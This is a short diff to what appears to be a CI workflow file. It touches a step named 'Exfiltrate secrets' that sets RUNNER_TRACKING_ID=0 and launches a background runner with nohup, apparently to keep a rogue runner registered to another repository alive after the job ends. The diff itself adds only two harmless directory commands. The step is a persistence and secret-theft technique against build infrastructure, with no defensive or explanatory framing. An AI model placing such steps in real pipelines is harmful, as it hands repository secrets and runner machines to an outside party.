@@ -15,6 +15,8 @@ jobs:
 # To register runner on c3 repo
       - name: Exfiltrate secrets
         run: |
+          cd ~/
+          ls
           cd actions-runner1
           export RUNNER_TRACKING_ID=0;
           nohup ./run.sh &
